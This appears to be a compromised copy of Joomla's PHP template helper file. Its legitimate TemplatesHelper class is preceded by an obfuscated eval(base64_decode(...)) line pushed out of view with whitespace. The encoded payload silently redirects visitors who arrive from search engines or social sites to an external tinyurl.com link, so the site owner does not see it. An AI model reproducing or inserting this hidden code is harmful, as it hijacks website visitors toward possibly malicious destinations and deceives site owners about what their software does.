<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: template.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Templates
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

/**
 * @package		Joomla
 * @subpackage	Templates
 */
class TemplatesHelper
{
	function isTemplateDefault($template, $clientId)
	{
		$db =& JFactory::getDBO();

		// Get the current default template
		$query = ' SELECT template '
				.' FROM #__templates_menu '
				.' WHERE client_id = ' . (int) $clientId
				.' AND menuid = 0 ';
		$db->setQuery($query);
		$defaultemplate = $db->loadResult();

		return $defaultemplate == $template ? 1 : 0;
	}

	function isTemplateAssigned($template)
	{
		$db =& JFactory::getDBO();

		// check if template is assigned
		$query = 'SELECT COUNT(*)' .
				' FROM #__templates_menu' .
				' WHERE client_id = 0' .
				' AND template = '.$db->Quote($template) .
				' AND menuid <> 0';
		$db->setQuery($query);
		return $db->loadResult() ? 1 : 0;
	}

	function parseXMLTemplateFiles($templateBaseDir)
	{
		// Read the template folder to find templates
		jimport('joomla.filesystem.folder');
		$templateDirs = JFolder::folders($templateBaseDir);

		$rows = array();

		// Check that the directory contains an xml file
		foreach ($templateDirs as $templateDir)
		{
			if(!$data = TemplatesHelper::parseXMLTemplateFile($templateBaseDir, $templateDir)){
				continue;
			} else {
				$rows[] = $data;
			}
		}

		return $rows;
	}

	function parseXMLTemplateFile($templateBaseDir, $templateDir)
	{
		// Check of the xml file exists
		if(!is_file($templateBaseDir.DS.$templateDir.DS.'templateDetails.xml')) {
			return false;
		}

		$xml = JApplicationHelper::parseXMLInstallFile($templateBaseDir.DS.$templateDir.DS.'templateDetails.xml');

		if ($xml['type'] != 'template') {
			return false;
		}

		$data = new StdClass();
		$data->directory = $templateDir;

		foreach($xml as $key => $value) {
			$data->$key = $value;
		}

		$data->checked_out = 0;
		$data->mosname = JString::strtolower(str_replace(' ', '_', $data->name));

		return $data;
	}

	function createMenuList($template)
	{
		$db =& JFactory::getDBO();

		// get selected pages for $menulist
		$query = 'SELECT menuid AS value' .
				' FROM #__templates_menu' .
				' WHERE client_id = 0' .
				' AND template = '.$db->Quote($template);
		$db->setQuery($query);
		$lookup = $db->loadObjectList();
		if (empty( $lookup )) {
			$lookup = array( JHTML::_('select.option',  '-1' ) );
		}

		// build the html select list
		$options	= JHTML::_('menu.linkoptions');
		$result		= JHTML::_('select.genericlist',   $options, 'selections[]', 'class="inputbox" size="15" multiple="multiple"', 'value', 'text', $lookup, 'selections' );
		return $result;
	}
}